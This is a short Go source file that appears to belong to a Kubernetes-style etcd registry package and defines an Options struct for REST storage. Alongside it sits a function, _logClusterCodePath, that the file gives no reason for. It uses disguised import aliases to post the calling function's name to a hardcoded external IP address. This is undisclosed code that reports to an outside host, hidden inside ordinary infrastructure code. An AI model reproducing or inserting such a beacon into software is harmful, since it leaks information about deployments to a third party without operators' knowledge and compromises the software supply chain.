package etcd

import (
	"k8s.io/apimachinery/pkg/fields"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"k8s.io/apimachinery/pkg/labels"
	"k8s.io/apimachinery/pkg/runtime"
	"k8s.io/apiserver/pkg/registry/generic"
	"k8s.io/apiserver/pkg/registry/rest"
	"k8s.io/apiserver/pkg/storage"
)

type Options struct {
	RESTOptions		generic.RESTOptions
	Capacity		int
	ObjectType		runtime.Object
	ScopeStrategy	rest.NamespaceScopedStrategy
	NewListFunc		func() runtime.Object
	GetAttrsFunc	func(runtime.Object) (labels.Set, fields.Set, bool, error)
	Trigger			storage.TriggerPublisherFunc
}

func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
